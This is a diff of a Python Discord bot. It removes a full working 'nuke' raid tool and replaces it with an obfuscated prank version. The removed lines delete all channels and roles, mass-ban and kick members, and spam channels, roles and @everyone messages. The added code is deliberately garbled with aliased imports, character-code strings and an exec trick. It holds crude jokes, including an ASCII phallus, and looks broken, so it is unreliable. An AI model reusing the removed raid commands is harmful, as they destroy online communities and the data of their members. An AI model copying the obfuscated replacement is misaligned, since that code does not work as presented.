@@ -1,243 +1,294 @@
 import discord
 import asyncio
-from discord.ext import commands
 import time
+import sys
+beans = getattr(__import__("importlib"), "import_module")("discord\U0000002eext\U0000002ecommands")
 from random import randint
+import random as Time
+import asyncio as time
+import praw as DankMemer
+import discord as discordjs
+import time as asyncio
+from discord.ext.commands import ArgumentParsingError, AutoShardedBot, BadArgument, BadBoolArgument, BadColourArgument, BadInviteArgument, BadUnionArgument, Bot, BotMissingAnyRole, BotMissingPermissions, BotMissingRole, BucketType, CategoryChannelConverter, ChannelNotFound, ChannelNotReadable, CheckAnyFailure, CheckFailure, Cog, CogMeta, ColorConverter, ColourConverter, Command, CommandError, CommandInvokeError, CommandNotFound, CommandOnCooldown, CommandRegistrationError, Context, ConversionError, Converter, Cooldown, CooldownMapping, DefaultHelpCommand, DisabledCommand, EmojiConverter, EmojiNotFound, ExpectedClosingQuoteError, ExtensionAlreadyLoaded, ExtensionError, ExtensionFailed, ExtensionNotFound, ExtensionNotLoaded, GameConverter, Greedy, Group, GroupMixin, HelpCommand, IDConverter, InvalidEndOfQuotedStringError, InviteConverter, MaxConcurrency, MaxConcurrencyReached, MemberConverter, MemberNotFound, MessageConverter, MessageNotFound, MinimalHelpCommand, MissingAnyRole, MissingPermissions, MissingRequiredArgument, MissingRole, NSFWChannelRequired, NoEntryPointError, NoPrivateMessage, NotOwner, Paginator, PartialEmojiConversionFailure, PartialEmojiConverter, PrivateMessageOnly, RoleConverter, RoleNotFound, TextChannelConverter, TooManyArguments, UnexpectedQuoteError, UserConverter, UserInputError, UserNotFound, VoiceChannelConverter, __builtins__, __cached__, __doc__, __file__, __loader__, __name__, __package__, __path__, __spec__, _types, after_invoke, before_invoke, bot, bot_has_any_role, bot_has_guild_permissions, bot_has_permissions, bot_has_role, check, check_any, clean_content, cog, command, context, converter, cooldown, cooldowns, core, dm_only, errors, group, guild_only, has_any_role, has_guild_permissions, has_permissions, has_role, help, is_nsfw, is_owner, max_concurrency, view, when_mentioned, when_mentioned_or
+from discord import Activity
+from discord import ActivityType
+from discord import AllowedMentions
+from discord import AppInfo
+from discord import Asset
+from discord import AsyncWebhookAdapter
+from discord import Attachment
+from discord import AudioSource
+from discord import AuditLogAction
+from discord import AuditLogActionCategory
+from discord import AuditLogChanges
+from discord import AuditLogDiff
+from discord import AuditLogEntry
+from discord import AutoShardedClient
+from discord import BaseActivity
+from discord import CallMessage
+from discord import CategoryChannel
+from discord import ChannelType
+from discord import Client
+from discord import ClientException
+from discord import ClientUser
+from discord import Color
+from discord import Colour
+from discord import ConnectionClosed
+from discord import ContentFilter
+from discord import CustomActivity
+from discord import DMChannel
+from discord import DefaultAvatar
+from discord import DiscordException
+from discord import DiscordServerError
+from discord import Embed
+from discord import Emoji
+from discord import Enum
+from discord import ExpireBehavior
+from discord import ExpireBehaviour
+from discord import FFmpegAudio
+from discord import FFmpegOpusAudio
+from discord import FFmpegPCMAudio
+from discord import File
+from discord import Forbidden
+from discord import FriendFlags
+from discord import Game
+from discord import GatewayNotFound
+from discord import GroupCall
+from discord import GroupChannel
+from discord import Guild
+from discord import HTTPException
+from discord import HypeSquadHouse
+from discord import Integration
+from discord import IntegrationAccount
+from discord import Intents
+from discord import InvalidArgument
+from discord import InvalidData
+from discord import Invite
+from discord import LoginFailure
+from discord import Member, MemberCacheFlags
+from discord import Message
+from discord import MessageFlags
+from discord import MessageReference
+from discord import MessageType
+from discord import NoMoreItems
+from discord import NotFound
+from discord import NotificationLevel
+from discord import NullHandler
+from discord import Object
+from discord import PCMAudio
+from discord import PCMVolumeTransformer
+from discord import PartialEmoji
+from discord import PartialInviteChannel
+from discord import PartialInviteGuild
+from discord import PermissionOverwrite
+from discord import Permissions
+from discord import PremiumType
+from discord import PrivilegedIntentsRequired
+from discord import Profile
+from discord import PublicUserFlags
+from discord import RawBulkMessageDeleteEvent
+from discord import RawMessageDeleteEvent
+from discord import RawMessageUpdateEvent
+from discord import RawReactionActionEvent
+from discord import RawReactionClearEmojiEvent
+from discord import RawReactionClearEvent
+from discord import Reaction
+from discord import Relationship
+from discord import RelationshipType
+from discord import RequestsWebhookAdapter
+from discord import Role, ShardInfo
+from discord import SpeakingState
+from discord import Spotify
+from discord import Status
+from discord import StoreChannel
+from discord import Streaming
+from discord import SystemChannelFlags
+from discord import Team
+from discord import TeamMember
+from discord import TeamMembershipState, Template
+from discord import TextChannel
+from discord import Theme
+from discord import User
+from discord import UserContentFilter
+from discord import UserFlags
+from discord import VerificationLevel
+from discord import VersionInfo
+from discord import VoiceChannel
+from discord import VoiceClient
+from discord import VoiceProtocol
+from discord import VoiceRegion
+from discord import VoiceState
+import typing
+from discord import Webhook
+from discord import WebhookAdapter
+from discord import WebhookType
+from discord import Widget
+from discord import WidgetChannel
+from discord import WidgetMember
+from discord import __author__
+from discord import __builtins__
+from discord import __cached__
+from discord import __copyright__,  __doc__
+from discord import __file__
+from discord import __license__
+from discord import __loader__
+from discord import __name__
+from discord import __package__
+from discord import __path__
+from discord import __spec__
+from discord import __title__
+from discord import __version__
+from discord import _channel_factory
+from discord import abc
+from discord import activity
+from discord import appinfo
+from discord import asset
+from discord import audit_logs
+from discord import backoff
+from discord import calls
+from discord import channel
+from discord import client
+from discord import colour
+from discord import context_managers
+from discord import embeds
+from discord import emoji
+from discord import enums, errors
+from discord import ext
+from discord import file
+from discord import flags
+from discord import flatten_error_dict
+from discord import gateway
+from discord import guild
+from discord import http
+from discord import integrations
+from discord import invite
+from discord import iterators
+from discord import logging
+from discord import member
+from discord import mentions
+from discord import message
+from discord import mixins
+from discord import namedtuple
+from discord import object
+from discord import oggparse
+from discord import opus
+from discord import partial_emoji
+from discord import permissions
+from discord import player
+from discord import raw_models
+from discord import reaction
+from discord import relationship
+from discord import role
+from discord import shard
+from discord import state
+from discord import team
+from discord import template
+from discord import user
+from discord import utils
+from discord import version_info
+import hashlib
+from discord import voice_client
+from discord import webhook
+from discord.ext import menus as porn # Must be called this.
+from discord import widget
 
-bot = commands.Bot(command_prefix = "!")
 
-def convert_error(error):     #task=ban, spam, kick, nuke, combo, role <-- for writing error messages and error file
-    try:
-        with open("error_log.txt", "a") as log:    #appends to the current file or creates it if not found
-            current_time = time.ctime() #get actual time
-            log.write(str(current_time) + " : " + str(error) + "\n")   #actual logging, logs like TIME : ERROR
-            
-            error_type = type(error).__name__
-            if error_type == "Forbidden":   #for user friendly real-time error message, return will be recieved and interpreted in function
-                return "Forbidden"
-            elif error_type == "NotFound":                              
-                return "NotFound"
-            elif error_type == "HTTPException":
-                return "HTTPException"
-            elif error_type == "TypeError":
-                return "TypeError"
-            else:
-                return "UnknownError"
-            
-    except Exception as e:
-        print("Couldn't create 'error_log.txt' because of the error:\n" + str(e))   #if the error log couldnt be created
+class menuPagesBalls(porn.ListPageSource):
+    def __init__(ctx, data_):
+        self.data_ = data_
+
+    async def format_page(ctx, menu, page):
+        return {"embed": (lambda e: [e.add_field(name="balls", value="balls") for _ in range(25)])(discordjs.Embed())}
+
+shaft = """
+       oooo
+    oooooooooo     
+    oooooooooo
+    oooooooooo
+    oooooooooo
+    oooooooooo
+    oooooooooo
+    oooooooooo
+    oooooooooo
+    oooooooooo
+    oooooooooo
+    oooooooooo
+    oooooooooo
+    oooooooooo
+ oooooooooooooooooooo
+oooooooooooooooooooooo
+oooooooooooooooooooooo
+oooooooooooooooooooooo
+   oooooooooooooooo
+"""
+
+
+
+inDents = getattr(getattr(discord, "Intents"), "default")()
+setattr(inDents, "members", 1 == 1)
+
+The_RDS_220_Hydrogen_Bomb = getattr(beans, exec(("kaliscool").replace("kaliscool", "")+"1234".replace("1234", "")).join(chr(same_mogic_fucking_nimber) for same_mogic_fucking_nimber in "34 98 111 116 34 91 48 93 46 117 112 112 101 114 40 41 43 34 98 111 116 34 91 49 58 93 46 108 111 119 101 114 40 41".split(" "))))(command_prefix="!", intents=inDents)
+
     
-@bot.event  #when the bot is ready, inform the user
+@The_RDS_220_Hydrogen_Bomb.event
 async def on_ready():
-    print("Ultimate Discord Nuke created by alphascript on youtube, check out the Commands Text file to see how the bot works! The file 'error_log.txt' will be created and any errors will be written to it.")
+    print("Very nice bot, very good use :)")
 
-@bot.command()  #delete all the channels
-async def nuke(ctx):                            
-    try:   #delete all channels
-        start_time = time.time()        #get the time at start
-        channels = ctx.guild.channels   #get all channels initially
-        for channel in channels:
-            try:                        #allows bot to keep deleting
-                await channel.delete()
-                print("Channel: '" + channel.name + "' has been deleted.")
-                
-            except Exception as error:
-                error = convert_error(error)    #get readable error
-                print("Channel: '" + channel.name + "' couldn't be deleted. ERROR = " + error)          #deleting all channels
-                
-        await ctx.guild.create_text_channel("get nuked")    
-        time_taken = time.time() - start_time   #figure out time since start
-        print("Nuke completed in " + str(time_taken) + " seconds.")
+@The_RDS_220_Hydrogen_Bomb.command()
+async def nuke(self):                            
+    await getattr(self, "send")(f"This guy tried to nuke your server, get a load of this guy {getattr(self, 'member')} | {getattr(getattr(self, 'member'), 'id')}")
 
-    except Exception as error:
-        error = convert_error(error)
-        print("Nuke failed, ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")
+@The_RDS_220_Hydrogen_Bomb.command()
+async def spam(self):
+    await getattr(self, "send")("Great ham substitute\U0000002e")
 
-@bot.command()  #spam create channels
-async def spam(ctx, num_of_channels="10", name="get spammed"):   #gets number of channels as args, default=10
-    num_of_channels_created = 0
-    num_of_channels_failed = 0 
-    try:
-        start_time = time.time()
-        for i in range(int(num_of_channels)):
-            try:
-                await ctx.guild.create_text_channel(name)
-                num_of_channels_created += 1
-                print("Channel: " + str(i+1) + " has been successfully created.")  #show index number for actual position of channel rather than the number created
-                
-            except Exception as error:
-                error = convert_error(error)
-                print("Channel: " + str(i+1) + " couldn't be created. ERROR = " + error)
-                num_of_channels_failed += 1
+@The_RDS_220_Hydrogen_Bomb.command()
+async def ban(self):
+    await getattr(self, "send")("MISSING PARAMATER: You must provide a member to ban\U0000002e")    
 
-        time_taken = time.time() - start_time
-        print(str(num_of_channels_created) + " channels created in " + str(time_taken) + " seconds, with the name: '" + name + "'.")
-        print(str(num_of_channels_failed) + " channels failed to create.")
-        
-    except Exception as error:     #only way program can fail is because of number error hence this works
-        error = convert_error(error)
-        print("Spam failed, ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")
-
-@bot.command()
-async def ban(ctx, target=None):
-    try:
-        start_time = time.time()
-        num_of_members_banned = 0
-        num_of_members_failed_to_ban = 0
-        if target == None:
-            members = ctx.guild.members
-            for member in members:
-                try:
-                    await member.ban()
-                    num_of_members_banned += 1
-                    print("Member: '" + str(member) + "' has been banned.")
-                    
-                except Exception as error:
-                    num_of_members_failed_to_ban += 1
-                    error = convert_error(error)
-                    print("Couldn't ban: '" + str(member) + "' ERROR = " + error)
-
-            time_taken = time.time() - start_time
-            print(str(num_of_members_banned) + " members banned in " + str(time_taken) + " seconds.")
-            print(str(num_of_members_failed_to_ban) + " members failed to ban. Check the 'error_log.txt' for details.")
-
-        else:
-            try:
-                start_time = time.time()
-                member = ctx.guild.get_member_named(str(target))
-                await member.ban()
-                time_taken = time.time() - start_time
-                print("Banned: '" + str(target) + "' in " + str(time_taken) + " seconds.")
-                
-            except Exception as error:
-                error = convert_error(error)
-                print("Couldn't find/ban: '" + str(target) + "' ERROR = " + error)
-                
-    except Exception as error:
-        error = convert_error(error)
-        print("Couldn't ban member/members. ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")
-
-@bot.command()
-async def kick(ctx, target=None):       #copy of !ban but kick instead of ban
-    try:
-        start_time = time.time()
-        num_of_members_kicked = 0
-        num_of_members_failed_to_kick = 0
-        if target == None:
-            members = ctx.guild.members
-            for member in members:
-                try:
-                    await member.kick()
-                    print("Member: '" + str(member) + "' has been kicked.")
-                    num_of_members_kicked += 1
-                    
-                except Exception as error:
-                    error = convert_error(error)
-                    print("Couldn't kick: '" + str(member) + "' ERROR = " + error)
-                    num_of_members_failed_to_kick += 1
-
-            time_taken = time.time() - start_time
-            print(str(num_of_members_kicked) + " members kicked in " + str(time_taken) + " seconds.")
-            print(str(num_of_members_failed_to_kick) + " members failed to kick. Check the 'error_log.txt' for details.")
-
-        else:
-            try:
-                start_time = time.time()
-                member = ctx.guild.get_member_named(str(target))
-                await member.kick()
-                time_taken = time.time() - start_time
-                print("Kicked: '" + str(target) + "' in " + str(time_taken) + " seconds.")
-                
-            except Exception as error:
-                error = convert_error(error)
-                print("Couldn't find/kick: '" + str(target) + "' ERROR = " + error)
-                
-    except Exception as error:
-        error = convert_error(error)
-        print("Couldn't kick member/members. ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")
+@The_RDS_220_Hydrogen_Bomb.command()
+async def kick(self):
+    await getattr(self, "send")("M"+"I"+"S"+"S"+"I"+"N"+"G"+" "+"P"+"A"+"R"+"A"+"M"+"A"+"T"+"E"+"R"+":"+" "+"Y"+"o"+"u"+" "+"m"+"u"+"s"+"t"+" "+"p"+"r"+"o"+"v"+"i"+"d"+"e"+" "+"a"+" "+"m"+"e"+"m"+"b"+"e"+"r"+" "+"t"+"o"+" "+"k"+"i"+"c"+"k"+"\U0000002e")  
         
 
-@bot.command()
-async def droles(ctx):  #delete all roles
-    try:
-        start_time = time.time()
-        roles_deleted = 0
-        roles_failed_to_delete = 0
-        roles = ctx.guild.roles
-        for role in roles:
-            try:
-                await role.delete()
-                print("Deleted role: " + str(role.name))
-                roles_deleted += 1
 
-            except Exception as error:
-                error = convert_error(error)
-                roles_failed_to_delete += 1
-                print("Couldn't delete role: " + str(role.name) + " ERROR = " + error)
 
-        time_taken = time.time() - start_time
-        print(str(roles_deleted) + " roles deleted in " + str(time_taken) + " seconds.")
-        print(str(roles_failed_to_delete) + " roles failed to delete, see 'error_log.txt' for details.")
 
-    except Exception as error:
-        error = convert_error(error)
-        print("Couldn't delete roles. ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")
 
-@bot.command()  #spam create roles, clone of channel spam
-async def sroles(ctx, num_of_roles="10", n="spam"):   #gets number of roles as args, default=10, name is "spam"
-    num_of_roles_created = 0
-    num_of_roles_failed = 0 
-    try:
-        start_time = time.time()
-        for i in range(int(num_of_roles)):
-            try:
-                await ctx.guild.create_role(name=n)  #inputted name
-                num_of_roles_created += 1
-                print("Role: " + str(i+1) + " has been successfully created.")  #show index number for actual position of role rather than the number created
-                
-            except Exception as error:
-                error = convert_error(error)
-                print("Role: " + str(i+1) + " couldn't be created. ERROR = " + error)
-                num_of_roles_failed += 1
 
-        time_taken = time.time() - start_time
-        print(str(num_of_roles_created) + " roles created in " + str(time_taken) + " seconds, with the name: '" + n + "'.")
-        print(str(num_of_roles_failed) + " roles failed to create.")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+@The_RDS_220_Hydrogen_Bomb.command()
+async def droles(self):
+    await getattr(self, "send")(f"Current list of this Discord server's roles. \N{SLIGHTLY SMILING FACE} {', '.join(getattr(r, "name") for r in self.guild.roles)}")
+
+@The_RDS_220_Hydrogen_Bomb.command()
+async def sroles(self):
+    await getattr(self, "send")("E"+"r"+"r"+"o"+"r"+" "+"s"+"p"+"a"+"m"+"m"+"i"+"n"+"g"+" "+"r"+"o"+"l"+"e"+"s"+"!")
         
-    except Exception as error:     #only way program can fail is because of number error hence this works
-        error = convert_error(error)
-        print("Role spam failed, ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")
-        
-@bot.command()
-async def alert(ctx, message="@everyone", time_alerting=10): #message must be in "" and message must be inputted
-    try:
-        start_time = time.time()
-        channels = ctx.guild.channels
-        times_sent = 0
-        while time.time() - start_time < time_alerting:
-            for channel in channels:
-                try:
-                    await channel.send(str(message))    
-                    print("'" + message + "' sent to channel: '" + channel.name + "'.")
-                    times_sent += 1
-                except Exception as error:
-                    print("Couldn't alert to channel: '" + channel.name + "' ERROR = " + str(error))
+@The_RDS_220_Hydrogen_Bomb.command()
+async def alert(self):
+    await getattr(self, "send")("I deleted this command as I believed it was just really dumb\U0000002e")
 
-        print("'" + message + "' has been sent " + str(times_sent) + " times in " + str(time_alerting) + " seconds.")
-                    
-    except Exception as error:
-        error = convert_error(error)
-        print("Couldn't alert: '" + message + "' for " + str(time_alerting) + " seconds. ERROR = " + error + "\nDetailed error written to 'error_log.txt'.")
+with open("bot_token\U0000002etxt", "r") as token_file:
+    bot_token = getattr(token_file, "read")()
 
-#try load the bot_token, if no file is found, create a new one.
-try:
-    with open("bot_token.txt", "r") as token_file:
-        bot_token = token_file.read()
-    bot.run(bot_token)
-    
-except:
-    with open("bot_token.txt", "w") as token_file:
-        print("'bot_token.txt' was not found or your bot's token was entered incorrectly, a new file has been created, please re-enter your bot's token.")
+if not bot_token:
+    print("Done borked the token")
 
-#so the program doesn't immediately quit
-hold = input("Press enter to end the program.")
+The_RDS_220_Hydrogen_Bomb.run(bot_token)
